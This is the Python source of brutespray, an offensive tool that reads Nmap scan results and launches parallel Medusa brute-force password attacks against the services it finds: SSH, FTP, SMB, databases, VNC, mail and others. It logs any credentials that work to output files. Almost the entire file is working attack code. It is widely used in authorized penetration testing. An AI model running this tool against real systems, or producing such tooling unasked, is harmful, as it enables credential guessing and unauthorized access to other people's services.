#!/usr/bin/python
# -*- coding: utf-8 -*-
from argparse import RawTextHelpFormatter
import readline, glob
import sys, time, os
import subprocess
import xml.dom.minidom
import re
import argparse
import argcomplete
import threading
import itertools
import tempfile
import shutil
from multiprocessing import Process

services = {}
loading = False

class colors:
    white = "\033[1;37m"
    normal = "\033[0;00m"
    red = "\033[1;31m"
    blue = "\033[1;34m"
    green = "\033[1;32m"
    lightblue = "\033[0;34m"

banner = colors.red + r"""
                              #@                           @/              
                           @@@                               @@@           
                        %@@@                                   @@@.        
                      @@@@@                                     @@@@%      
                     @@@@@                                       @@@@@     
                    @@@@@@@                  @                  @@@@@@@    
                    @(@@@@@@@%            @@@@@@@            &@@@@@@@@@    
                    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    
                     @@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@     
                       @@@( @@@@@#@@@@@@@@@*@@@,@@@@@@@@@@@@@@@  @@@       
                           @@@@@@ .@@@/@@@@@@@@@@@@@/@@@@ @@@@@@           
                                  @@@   @@@@@@@@@@@   @@@                  
                                 @@@@*  ,@@@@@@@@@(  ,@@@@                 
                                 @@@@@@@@@@@@@@@@@@@@@@@@@                 
                                  @@@.@@@@@@@@@@@@@@@ @@@                  
                                    @@@@@@ @@@@@ @@@@@@                    
                                       @@@@@@@@@@@@@                       
                                       @@   @@@   @@                       
                                       @@ @@@@@@@ @@                       
                                         @@% @  @@                 

"""+'\n' \
+ r"""
        ██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
        ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
        ██████╔╝██████╔╝██║   ██║   ██║   █████╗  ███████╗██████╔╝██████╔╝███████║ ╚████╔╝ 
        ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝  
        ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗███████║██║     ██║  ██║██║  ██║   ██║   
        ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                                                                   
"""+'\n' \
+ '\n brutespray.py v1.5.2' \
+ '\n Created by: Shane Young/@x90skysn3k && Jacob Robles/@shellfail' \
+ '\n Inspired by: Leon Johnson/@sho-luv' \
+ '\n Credit to Medusa: JoMo-Kun / Foofus Networks <jmk@foofus.net>\n' + colors.normal
#ascii art by: Cara Pearson

class tabCompleter(object):

    def pathCompleter(self,text,state):
        line   = readline.get_line_buffer().split()

        return [x for x in glob.glob(text+'*')][state]

def interactive():
    t = tabCompleter()
    singluser = ""
    if args.interactive is True:
        print colors.white + "\n\nWelcome to interactive mode!\n\n" + colors.normal
        print colors.red + "WARNING:" + colors.white + " Leaving an option blank will leave it empty and refer to default\n\n" + colors.normal
        print "Available services to brute-force:"
        for serv in services:
            srv = serv
            for prt in services[serv]:
                iplist = services[serv][prt]
                port = prt
                plist = len(iplist)
                print "Service: " + colors.green + str(serv) + colors.normal + " on port " + colors.red + str(port) + colors.normal + " with " + colors.red + str(plist) + colors.normal + " hosts"

        args.service = raw_input('\n' + colors.lightblue + 'Enter services you want to brute - default all (ssh,ftp,etc): ' + colors.red)
        
        args.threads = raw_input(colors.lightblue + 'Enter the number of parallel threads (default is 2): ' + colors.red)

        args.hosts = raw_input(colors.lightblue + 'Enter the number of parallel hosts to scan per service (default is 1): ' + colors.red)

        if args.passlist is None or args.userlist is None:
            customword = raw_input(colors.lightblue + 'Would you like to specify a wordlist? (y/n): ' + colors.red)
        if customword == "y":
            readline.set_completer_delims('\t')
            readline.parse_and_bind("tab: complete")
            readline.set_completer(t.pathCompleter)
            if args.userlist is None and args.username is None:
                args.userlist = raw_input(colors.lightblue + 'Enter a userlist you would like to use: ' + colors.red)
                if args.userlist == "":
                    args.userlist = None
            if args.passlist is None and args.password is None:
                args.passlist = raw_input(colors.lightblue + 'Enter a passlist you would like to use: ' + colors.red)
                if args.passlist == "":
                    args.passlist = None
            
        if args.username is None or args.password is None: 
            singluser = raw_input(colors.lightblue + 'Would to specify a single username or password (y/n): ' + colors.red)
        if singluser == "y":
            if args.username is None and args.userlist is None:
                args.username = raw_input(colors.lightblue + 'Enter a username: ' + colors.red)
                if args.username == "":
                    args.username = None
            if args.password is None and args.passlist is None:
                args.password = raw_input(colors.lightblue + 'Enter a password: ' + colors.red)
                if args.password == "":
                    args.password = None

        if args.service == "":
            args.service = "all"
        if args.threads == "":
            args.threads = "2"
        if args.hosts == "":
            args.hosts = "1"

    print colors.normal

def make_dic_gnmap():
    global loading
    global services
    port = None
    with open(args.file, 'r') as nmap_file:
        for line in nmap_file:
            supported = ['ssh','ftp','postgres','telnet','mysql','ms-sql-s','shell','vnc','imap','imaps','nntp','pcanywheredata','pop3','pop3s','exec','login','microsoft-ds','smtp', 'smtps','submission','svn','iss-realsecure']
            for name in supported:
                matches = re.compile(r'([0-9][0-9]*)/open/[a-z][a-z]*//' + name)
                try:
                    port =  matches.findall(line)[0]
                except:
                    continue
    
                ip = re.findall( r'[0-9]+(?:\.[0-9]+){3}', line)
                tmp_ports = matches.findall(line)
                for tmp_port in tmp_ports:
                        if name =="ms-sql-s":
                            name = "mssql"
                        if name == "microsoft-ds":
                            name = "smbnt"
                        if name == "pcanywheredata":
                            name = "pcanywhere"
                        if name == "shell":
                            name = "rsh"
                        if name == "exec":
                            name = "rexec"
                        if name == "login":
                            name = "rlogin"
                        if name == "smtps" or name == "submission":
                            name = "smtp"
                        if name == "imaps":
                            name = "imap"
                        if name == "pop3s":
                            name = "pop3"
                        if name == "iss-realsecure":
                            name = "vmauthd"
                        if name in services:
                            if tmp_port in services[name]:
                                services[name][tmp_port] += ip
                            else:
                                services[name][tmp_port] = ip
                        else:
                            services[name] = {tmp_port:ip}

    loading = True

def make_dic_xml():
    global loading
    global services
    supported = ['ssh','ftp','postgresql','telnet','mysql','ms-sql-s','rsh','vnc','imap','imaps','nntp','pcanywheredata','pop3','pop3s','exec','login','microsoft-ds','smtp','smtps','submission','svn','iss-realsecure']
    doc = xml.dom.minidom.parse(args.file)
    for host in doc.getElementsByTagName("host"):
        try:
            address = host.getElementsByTagName("address")[0]
            ip = address.getAttribute("addr")
            eip = ip.encode("utf8")
            iplist = eip.split(',')
        except:
            # move to the next host
            continue
        try:
            status = host.getElementsByTagName("status")[0]
            state = status.getAttribute("state")
        except:
            state = ""
        try:
            ports = host.getElementsByTagName("ports")[0]
            ports = ports.getElementsByTagName("port")
        except:
            continue

        for port in ports:
            pn = port.getAttribute("portid")
            state_el = port.getElementsByTagName("state")[0]
            state = state_el.getAttribute("state")
            if state == "open":
                try:
                    service = port.getElementsByTagName("service")[0]
                    port_name = service.getAttribute("name")
                except:
                    service = ""
                    port_name = ""
                    product_descr = ""
                    product_ver = ""
                    product_extra = ""
                name = port_name.encode("utf-8")
                tmp_port = pn.encode("utf-8")
                if name in supported:
                    if name == "postgresql":
                        name = "postgres"
                    if name =="ms-sql-s":
                        name = "mssql"
                    if name == "microsoft-ds":
                        name = "smbnt"
                    if name == "pcanywheredata":
                        name = "pcanywhere"
                    if name == "shell":
                        name = "rsh"
                    if name == "exec":
                        name = "rexec"
                    if name == "login":
                        name = "rlogin"
                    if name == "smtps" or name == "submission":
                        name = "smtp"
                    if name == "imaps":
                        name = "imap"
                    if name == "pop3s":
                        name = "pop3"
                    if name == "iss-realsecure":
                        name = "vmauthd"
                    if name in services:
                        if tmp_port in services[name]:
                            services[name][tmp_port] += iplist
                        else:   
                         services[name][tmp_port] = iplist
                    else:
                        services[name] = {tmp_port:iplist}
    loading = True        


def brute(service,port,fname,output):

    if args.userlist is None and args.username is None:
        userlist = 'wordlist/'+service+'/user'
        uarg = '-U'
    elif args.userlist:
        userlist = args.userlist
        uarg = '-U'
    elif args.username:
        userlist = args.username
        uarg = '-u'

    if args.passlist is None and args.password is None:
        passlist = 'wordlist/'+service+'/password'
        parg = '-P'
    elif args.passlist:
        passlist = args.passlist
        parg = '-P'
    elif args.password:
        passlist = args.password
        parg = '-p'
    
    if args.continuous:
        cont = ''
    else:
        cont = '-F'
    
    p = subprocess.Popen(['medusa', '-H', fname, uarg, userlist, parg, passlist, '-M', service, '-t', args.threads, '-n', port, '-T', args.hosts, cont], stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=-1)

    out = "[" + colors.green + "+" + colors.normal + "] "
    output_file = output + '/' + service + '-success.txt'
    
 
    for line in iter(p.stdout.readline, b''):
        print line,
        sys.stdout.flush()
        time.sleep(0.0001)
        if 'SUCCESS' in line:
            f = open(output_file, 'a')
            f.write(out + line)
            f.close()    
   
def animate():
        t_end = time.time() + 2
        for c in itertools.cycle(['|', '/', '-', '\\']):
            if not time.time() < t_end:
                break
            sys.stdout.write('\rStarting to brute, please make sure to use the right amount of threads(-t) and parallel hosts(-T)...  ' + c)
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write('\n\nBrute-Forcing...     \n') 
        time.sleep(1)

def loading():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if loading == True:
            break
        sys.stdout.write('\rLoading File: ' + c)
        sys.stdout.flush()
        time.sleep(0.01)

def parse_args():
    
    parser = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter, description=\
 
    "Usage: python brutespray.py <OPTIONS> \n")

    menu_group = parser.add_argument_group(colors.lightblue + 'Menu Options' + colors.normal)
    
    menu_group.add_argument('-f', '--file', help="GNMAP or XML file to parse", required=True)
    menu_group.add_argument('-o', '--output', help="Directory containing successful attempts", default="brutespray-output")
    menu_group.add_argument('-s', '--service', help="specify service to attack", default="all")
    menu_group.add_argument('-t', '--threads', help="number of medusa threads", default="2")
    menu_group.add_argument('-T', '--hosts', help="number of hosts to test concurrently", default="1")
    menu_group.add_argument('-U', '--userlist', help="reference a custom username file", default=None)
    menu_group.add_argument('-P', '--passlist', help="reference a custom password file", default=None)
    menu_group.add_argument('-u', '--username', help="specify a single username", default=None)
    menu_group.add_argument('-p', '--password', help="specify a single password", default=None)
    menu_group.add_argument('-c', '--continuous', help="keep brute-forcing after success", default=False, action='store_true')
    menu_group.add_argument('-i', '--interactive', help="interactive mode", default=False, action='store_true')    

    argcomplete.autocomplete(parser)    
    args = parser.parse_args()
    
    return args

if __name__ == "__main__":
    print(banner)
    args = parse_args()

    #temporary directory for ip addresses
    try:
        tmppath = tempfile.mkdtemp(prefix="brutespray-tmp")
    except:
        sys.stderr.write("\nError while creating brutespray temp directory.")
        exit(4)

    if not os.path.exists(args.output):
        os.mkdir(args.output)

    if os.system("command -v medusa > /dev/null") != 0:
        sys.stderr.write("Command medusa not found. Please install medusa before using brutespray")
        exit(3)
        
    try:
        t = threading.Thread(target=loading)
        t.start()
        doc = xml.dom.minidom.parse(args.file)
        make_dic_xml()
    except:
        make_dic_gnmap()
    
    if args.interactive is True:
        interactive()
    
    animate()
    
    if services == {}:
        print "\nNo brutable services found.\n Please check your Nmap file."
 
    to_scan = args.service.split(',')
    for service in services:
        if service in to_scan or to_scan == ['all']:
            for port in services[service]:
                fname = tmppath + '/' +service + '-' + port
                iplist = services[service][port]
                f = open(fname, 'w+')
                for ip in iplist:
                    f.write(ip + '\n')
                f.close()
                brute_process = Process(target=brute, args=(service,port,fname,args.output))
                brute_process.start()

    #need to wait for all of the processes to run...
    #shutil.rmtree(tmppath, ignore_errors=False, onerror=None)
